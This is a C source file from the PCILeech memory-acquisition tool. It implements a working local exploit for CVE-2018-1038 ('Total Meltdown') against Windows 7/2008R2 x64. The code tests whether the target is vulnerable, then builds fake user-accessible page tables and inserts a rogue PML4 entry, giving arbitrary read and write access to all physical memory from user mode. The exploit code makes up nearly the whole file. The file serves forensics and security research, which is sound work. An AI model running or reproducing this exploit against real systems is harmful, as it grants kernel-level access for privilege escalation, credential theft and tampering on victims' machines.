// devicetmd.h : implementation related to the "total meltdown" memory acquisition "device".
//               Also known as: CVE-2018-1038. Please see Microsoft advisory for more information:
//               https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-1038
//
// (c) Ulf Frisk, 2018
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifdef WIN32
#include "devicetmd.h"
#include "util.h"
#include "vmm.h"

// PML4 self ref entry at position 0x1ed in Windows 7 (static offset/address)
// (this is not the case in Windows10 [which is not vulnerable...])
// ADDR_PML4 = 0xffff000000000000 | (0x1ed << (4*9+3)) | (0x1ed << (3*9+3)) | (0x1ed << (2*9+3)) | (0x1ed << (1*9+3))
#define TMD_VA_PML4                 0xFFFFF6FB7DBED000
#define TMD_VA_PML4_SELFREF         0xFFFFF6FB7DBEDF68

#pragma pack(push, 1) /* DISABLE STRUCT PADDINGS (REENABLE AFTER STRUCT DEFINITIONS) */
typedef struct tdMEMORY_RANGE {
    DWORD Reserved;
    QWORD pa;
    QWORD cb;
} MEMORY_RANGE, *PMEMORY_RANGE;
#pragma pack(pop) /* RE-ENABLE STRUCT PADDINGS */

typedef struct tdDEVICE_CONTEXT_TMD {
    QWORD vaBasePhys;
    QWORD paMax;
    QWORD iPML4ePhysMap;
    PMEMORY_RANGE pMemoryRanges;
    QWORD cMemoryRanges;
    PBYTE pbMemoryRangesBuffer;
    PVOID pvPageTables;
} DEVICE_CONTEXT_TMD, *PDEVICE_CONTEXT_TMD;

/*
* Retrieve the memory map from the registyr at HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory
* NB! Parsing is a bit sloppy and it may not work on all systems.
* Memory map retrieval is a must, since we cannot read memory belonging to memory mapped
* devices without risking of bluescreening the system. Memory map retrieval fixes this.
*/
BOOL DeviceTMD_MemoryMapRetrieve(PDEVICE_CONTEXT_TMD ctxTMd)
{
    LSTATUS status;
    HKEY hKey = NULL;
    DWORD dwRegType, cbData = 0;
    PBYTE pbData = NULL;
    QWORD c1, i, o, c2;
    PMEMORY_RANGE pMR;
    // 1: fetch binary data from registry
    status = RegOpenKeyA(HKEY_LOCAL_MACHINE, "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory", &hKey);
    if(status != ERROR_SUCCESS) { goto fail; }
    status = RegQueryValueExA(hKey, ".Translated", NULL, &dwRegType, NULL, &cbData);
    if(status != ERROR_SUCCESS || !cbData) { goto fail; }
    pbData = (PBYTE)LocalAlloc(0, cbData);
    if(!pbData) { goto fail; }
    status = RegQueryValueExA(hKey, ".Translated", NULL, &dwRegType, pbData, &cbData);
    if(status != ERROR_SUCCESS || !cbData) { goto fail; }
    RegCloseKey(hKey);
    hKey = NULL;
    // 2: translate data into memory regions
    c1 = *(PQWORD)pbData;
    if(!c1) { goto fail; }
    o = 0x10;
    c2 = *(PDWORD)(pbData + o); // this should be loop in case of c1 > 1, but works for now...
    if(!c2 || (cbData < c2 * sizeof(MEMORY_RANGE) + 0x14)) { goto fail; }
    o += sizeof(DWORD);
    pMR = (PMEMORY_RANGE)(pbData + o);
    for(i = 0; i < c2; i++) {
        pMR = (PMEMORY_RANGE)(pbData + o + i * sizeof(MEMORY_RANGE));
        if((pMR->pa & 0xfff) || (pMR->cb & 0xfff)) { goto fail; }
        if(pMR->Reserved & 0xff000000) {
            pMR->cb = pMR->cb << 8;
        }
    }
    ctxTMd->paMax = min(0x8000000000, pMR->pa + pMR->cb); // 512GB = max supported in this implmentation ...
    ctxTMd->cMemoryRanges = c2;
    ctxTMd->pbMemoryRangesBuffer = pbData;
    ctxTMd->pMemoryRanges = (PMEMORY_RANGE)(pbData + 0x14);
    return TRUE;
fail:
    if(hKey) { RegCloseKey(hKey); }
    if(pbData) { LocalFree(pbData); }
    return FALSE;
}

/*
* Verify that the previously set up "fake" page table required to read physical
* memory is still intact for the physical address specified in the pa parameter.
*/
BOOL DeviceTMD_VerifyPageTableIntegrity(_In_ PDEVICE_CONTEXT_TMD ctxTMd, _In_ QWORD pa)
{
    QWORD qwPDPTe, qwPDe, iPDPTe, iPDe, vaPDPTe, vaPDe;
    // 1: retrieve correct values of PDPTe and PDe.
    qwPDPTe = *(PQWORD)(((QWORD)ctxTMd->pvPageTables) + 0x200000 + ((pa >> (9 + 9 + 9 + 3)) << 3));
    qwPDe = *(PQWORD)(((QWORD)ctxTMd->pvPageTables) + ((pa >> (9 + 9 + 3)) << 3));
    // 2: calculate addresses of the real values of PDPTe and PDe.
    iPDPTe = 0x1ff & (pa >> (9 + 9 + 12));
    vaPDPTe = ((QWORD)0xffff << 48) | ((QWORD)0x1ed << (4 * 9 + 3)) | ((QWORD)0x1ed << (3 * 9 + 3)) | ((QWORD)0x1ed << (2 * 9 + 3)) | (ctxTMd->iPML4ePhysMap << (1 * 9 + 3)) | (iPDPTe << (0 * 9 + 3));
    iPDe = 0x1ff & (pa >> (9 + 12));
    vaPDe = ((QWORD)0xffff << 48) | ((QWORD)0x1ed << (4 * 9 + 3)) | ((QWORD)0x1ed << (3 * 9 + 3)) | (ctxTMd->iPML4ePhysMap << (2 * 9 + 3)) | (iPDPTe << (1 * 9 + 3)) | (iPDe << (0 * 9 + 3));
    // 3: check if values are still valid (real values matches corrrect values)
    //    if values does not match then the memory manager may have moved the
    //    "fake" page entries and it's not possible to continue without corrupt
    //    data and risk of BSOD.
    __try {
        return (qwPDPTe == *(PQWORD)vaPDPTe) && (qwPDe == *(PQWORD)vaPDe);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
}

BOOL DeviceTMD_IsMemoryInRange(PDEVICE_CONTEXT_TMD ctxTMd, QWORD pa)
{
    QWORD i;
    for(i = 0; i < ctxTMd->cMemoryRanges; i++) {
        if((pa >= ctxTMd->pMemoryRanges[i].pa) && (pa < ctxTMd->pMemoryRanges[i].pa + ctxTMd->pMemoryRanges[i].cb)) {
            return DeviceTMD_VerifyPageTableIntegrity(ctxTMd, pa);
        }
    }
    return FALSE;
}

/*
* Set up a "fake" page table hierchy that maps a max of 512GB physical memory.
* This should work unless any memory in the fake page table is paged to disk,
* or moved by the memory manager - which shouldn't happen in practice.
* This algorithm should much more BSOD proof (unlike the old algorithm that
* mapped a maximum of 31GB using hi-jacked pages - making it unstable).
*/
VOID DeviceTMD_SetupPageTable(_Inout_ PDEVICE_CONTEXT_TMD ctxTMd)
{
    QWORD i, iPML4e, iPDPTe, iPDe, iPTe, PTe, iPML4, vaPML4e, va, vaBase;
    // 1: Allocate [ 513 * 4k ] of virtual memory (514 pages). The first 512
    //    pages will serve as fake Page Directories (PD) serving 2MB large
    //    page mappings to physical memory (511 * 512 * 2MB -> 511GB).
    //    The last page will serve as the PDPT pointing to the 512 PDs.
    ctxTMd->pvPageTables = VirtualAlloc(0, 513 * 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(!ctxTMd->pvPageTables) { return; }
    vaBase = (QWORD)ctxTMd->pvPageTables;
    // 2: Fill up the pages at index 0-511 (which will serve as PDs) with fake
    //    2MB large page entries. At index 512 fill it up as a PDPT pointing to
    //    PDs at pages at index 0-510. With this it is possible to map a max of
    //    512GB memory - which should be way more memory than exists in almost
    //    all 7/2008R2 systems.
    //    As Page Directory Entry (PDE) 0xE7 the bits have the meaning (in IA-32e): 
    //       0 = P (Present),  1 = R/W (Read+Write), 2 = U/S (User),
    //       5 = A (Accessed), 6 = D (Dirty),        7 = PS (PageSize 2MB)
    for(i = 0; i < 512 * 512; i++) {
        *(PQWORD)(vaBase + (i << 3)) = (i << (9 + 9 + 3)) | 0xE7;
    }
    // 3: Calculate the index (0-512) in the PML4, PDPT, PD, PT of the virtual
    //    memory we use in order to map it into the to-be fake PDPT and our
    //    to be fake PML4-entry.
    for(i = 0; i < 513; i++) {
        va = (QWORD)(vaBase + (i << 12));
        iPML4e = (va & 0x0000FF8000000000) >> (3 * 9 + 12);
        iPDPTe = (va & 0x0000007FC0000000) >> (2 * 9 + 12);
        iPDe   = (va & 0x000000003FE00000) >> (1 * 9 + 12);
        iPTe   = (va & 0x00000000001FF000) >> (0 * 9 + 12);
        PTe = *(PQWORD)(((QWORD)0xffff << 48) | ((QWORD)0x1ed << (4 * 9 + 3)) | (iPML4e << (3 * 9 + 3)) | (iPDPTe << (2 * 9 + 3)) | (iPDe << (1 * 9 + 3)) | (iPTe << (0 * 9 + 3)));
        if(i < 512) {
            *(PQWORD)(vaBase + 0x200000 + (i << 3)) = (PTe & 0x0000fffffffff000) | 0x67;
        }
    }
    // 4: Find a spot in the PML4 to map the PDPT in there, this will serve
    //    as a "fake" mapping to the 511GB physical memory region.
    for(iPML4 = 256; iPML4 < 512; iPML4++) {
        vaPML4e = TMD_VA_PML4 + (iPML4 << 3);
        if(*(PQWORD)vaPML4e) { continue; }
        *(PQWORD)vaPML4e = (PTe & 0x0000fffffffff000) | 0x67;
        ctxTMd->iPML4ePhysMap = iPML4;
        ctxTMd->vaBasePhys = ((QWORD)0xffff << 48) | (iPML4 << (4 * 9 + 3));
        return;
    }
}

BOOL DeviceTMD_Identify()
{
    __try {
        return VmmTlbPageTableVerify(NULL, (PBYTE)TMD_VA_PML4, (*(PQWORD)TMD_VA_PML4_SELFREF) & 0x0000fffffffff000, TRUE);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
}

VOID DeviceTMD_ReadScatterDMA(_Inout_ PPCILEECH_CONTEXT ctx, _Inout_ PPDMA_IO_SCATTER_HEADER ppDMAs, _In_ DWORD cpDMAs, _Out_opt_ PDWORD pchDMAsRead)
{
    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctx->hDevice;
    PDMA_IO_SCATTER_HEADER pDMA;
    DWORD i, c = 0;
    for(i = 0; i < cpDMAs; i++) {
        pDMA = ppDMAs[i];
        if(!DeviceTMD_IsMemoryInRange(ctxTMd, pDMA->qwA)) { continue; }
        __try {
            memcpy(pDMA->pb, (PBYTE)(ctxTMd->vaBasePhys + pDMA->qwA), pDMA->cbMax);
        } 
        __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
        pDMA->cb = pDMA->cbMax;
        c++;
    }
    if(pchDMAsRead) {
        *pchDMAsRead = c;
    }
}

VOID DeviceTMD_ProbeDMA(_Inout_ PPCILEECH_CONTEXT ctx, _In_ QWORD qwAddr, _In_ DWORD cPages, _Inout_ __bcount(cPages) PBYTE pbResultMap)
{
    QWORD i;
    for(i = 0; i < cPages; i++) {
        pbResultMap[i] = DeviceTMD_IsMemoryInRange((PDEVICE_CONTEXT_TMD)ctx->hDevice, (qwAddr + (i << 12))) ? 1 : 0;
    }
}

BOOL DeviceTMD_WriteDMA(_Inout_ PPCILEECH_CONTEXT ctx, _In_ QWORD qwA, _In_ PBYTE pb, _In_ DWORD cb)
{
    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctx->hDevice;
    if(!DeviceTMD_IsMemoryInRange(ctxTMd, qwA)) { return FALSE; }
    __try {
        memcpy((PBYTE)(ctxTMd->vaBasePhys + qwA), pb, cb);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
    return TRUE;
}

VOID DeviceTMD_Close(_Inout_ PPCILEECH_CONTEXT ctx)
{
    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctx->hDevice;
    if(!ctxTMd) { return; }
    if(ctxTMd->pvPageTables) {
        *(PQWORD)(TMD_VA_PML4 + (ctxTMd->iPML4ePhysMap << 3)) = 0;
        VirtualFree(ctxTMd->pvPageTables, 0, MEM_RELEASE);
    }
    LocalFree(ctxTMd);
    ctx->hDevice = 0;
}

BOOL DeviceTMD_Open(_Inout_ PPCILEECH_CONTEXT ctx)
{
    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)LocalAlloc(LMEM_ZEROINIT, sizeof(DEVICE_CONTEXT_TMD));
    if(!ctxTMd) { return FALSE; }
    // 1: Test for vulnerability and set up page tables using for virtual2physical mappings
    if(!DeviceTMD_Identify()) {
        printf(
            "TOTALMELTDOWN: Failed.  System not vulnerable for Total Meltdown attack.\n" \
            "  Only Windows 7/2008R2 x64 with 2018-01, 2018-02, 2018-03 patches are vulnerable.\n");
        goto fail;
    }
    // 2: Retrieve physical memory map from registry
    if(!DeviceTMD_MemoryMapRetrieve(ctxTMd)) {
        printf("TOTALMELTDOWN: Failed. Failed parsing memory map from registry.\n");
        goto fail;
    }
    // 3: Exploit! == create page table mappings.
    DeviceTMD_SetupPageTable(ctxTMd);
    // 4: Set callback functions and fix up config
    ctx->hDevice = (HANDLE)ctxTMd;
    ctx->cfg->dev.tp = PCILEECH_DEVICE_TOTALMELTDOWN;
    ctx->cfg->dev.qwMaxSizeDmaIo = 0x00100000;          // 1MB
    ctx->cfg->dev.qwAddrMaxNative = ctxTMd->paMax;
    ctx->cfg->dev.fPartialPageReadSupported = TRUE;
    ctx->cfg->dev.pfnClose = DeviceTMD_Close;
    ctx->cfg->dev.pfnProbeDMA = DeviceTMD_ProbeDMA;
    ctx->cfg->dev.pfnReadScatterDMA = DeviceTMD_ReadScatterDMA;
    ctx->cfg->dev.pfnWriteDMA = DeviceTMD_WriteDMA;
    if(ctx->cfg->fVerbose) {
        printf("TOTALMELTDOWN/CVE-2018-1038: Successfully exploited for physical memory access.\n");
    }
    return TRUE;
fail:
    LocalFree(ctxTMd);
    return FALSE;
}

#endif /* WIN32 */
#if defined(LINUX) || defined(ANDROID)
#include "devicetmd.h"

BOOL DeviceTMD_Open(_Inout_ PPCILEECH_CONTEXT ctx)
{
    if(ctx->cfg->dev.tp == PCILEECH_DEVICE_TOTALMELTDOWN) {
        printf(
            "TOTALMELTDOWN: Failed.  System not vulnerable for Total Meltdown attack.\n" \
            "  Only Windows 7/2008R2 x64 with 2018-01, 2018-02, 2018-03 patches are vulnerable.\n");
    }
    return FALSE;
}

#endif /* LINUX || ANDROID */
